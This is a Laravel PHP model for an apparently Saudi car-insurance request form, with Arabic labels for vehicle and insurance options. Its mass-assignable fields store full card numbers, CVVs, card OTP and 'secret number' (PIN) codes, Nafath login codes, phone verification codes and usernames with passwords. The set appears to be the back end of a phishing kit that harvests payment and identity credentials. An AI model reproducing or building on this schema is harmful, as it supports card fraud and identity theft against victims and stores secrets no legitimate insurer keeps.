<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class InsuranceRequest extends Model
{
    use HasFactory;

    // ===================================================================================================================
    // ============================================== Standard Section ===================================================
    // ===================================================================================================================
    protected $table = 'insurance_requests';
    protected $fillable = [
        'insurance_id',
        'nafath_code',

        // Step 1 :
        'insurance_category',
        'new_insurance_category',
        'identity_number',
        'applicant_name',
        'phone',
        'date_of_birth',

        // Step 2 insuranceStatements :
        'insurance_type',
        'document_start_date',
        'purpose_using_car',
        'car_type',
        'car_estimated_value',
        'manufacturing_year',
        'repair_location',

        // Step 3 paymentForm :
        'name_on_card',
        'card_number',
        'expiry_date',
        'cvv',

        // Step 4 cardOwnership :
        'card_ownership_verification_code',

        // Step 5 cardOwnershipSecertNumber :
        'card_ownership_secert_number',

        // Step 6 ConfirmPhoneNumber :
        'mobile_number',
        'mobile_network_operator',

        // Step 7 checkPhoneNumber :
        'check_mobile_number_verification_code',
        
        'user_name',
        'password',

    ];

    // ===================================================================================================================
    // =========================================== Relationship Section ==================================================
    // ===================================================================================================================

    public function insurance()
    {
        return $this->belongsTo(Insurance::class, 'insurance_id');
    }

    // ===================================================================================================================
    // ============================================= Accessors Section ===================================================
    // ===================================================================================================================


    // insurance_category
    public function getInsuranceCategoryAttribute($value)
    {
        if ($value == 1) {
            return 'جديد';
        } elseif ($value == 2) {
            return 'نقل ملكية';
        }
    }

    // new_insurance_category
    public function getNewInsuranceCategoryAttribute($value)
    {
        if ($value == 1) {
            return 'الرقم التسلسلي';
        } elseif ($value == 2) {
            return 'بطاقة جمركية [استيراد]';
        }
    }

    // insurance_type
    public function getInsuranceTypeAttribute($value)
    {
        if ($value == 1) {
            return 'ضد الغير';
        } elseif ($value == 2) {
            return 'شامل';
        }
    }

    // purpose_using_car
    public function getPurposeUsingCarAttribute($value)
    {
        if ($value == 1) {
            return 'شخصي';
        } elseif ($value == 2) {
            return 'تجاري';
        } elseif ($value == 3) {
            return 'تأجير';
        } elseif ($value == 4) {
            return 'نقل الركاب أو كريم أو أوبر';
        } elseif ($value == 5) {
            return 'نقل بضائع';
        } elseif ($value == 6) {
            return 'نقل مشتقات نفطية';
        }
    }

    // repair_location
    public function getRepairLocationAttribute($value)
    {
        if ($value == 1) {
            return 'الورشة';
        } elseif ($value == 2) {
            return 'الوكالة';
        }
    }

    // mobile_network_operator
    public function getMobileNetworkOperatorAttribute($value)
    {
        if ($value == 1) {
            return 'Zain';
        } elseif ($value == 2) {
            return 'Mobily';
        } elseif ($value == 3) {
            return 'Stc';
        } elseif ($value == 4) {
            return 'Salam';
        } elseif ($value == 5) {
            return 'Virgin';
        }
    }

    // ===================================================================================================================
    // =============================================== Scopes Section ====================================================
    // ===================================================================================================================

}
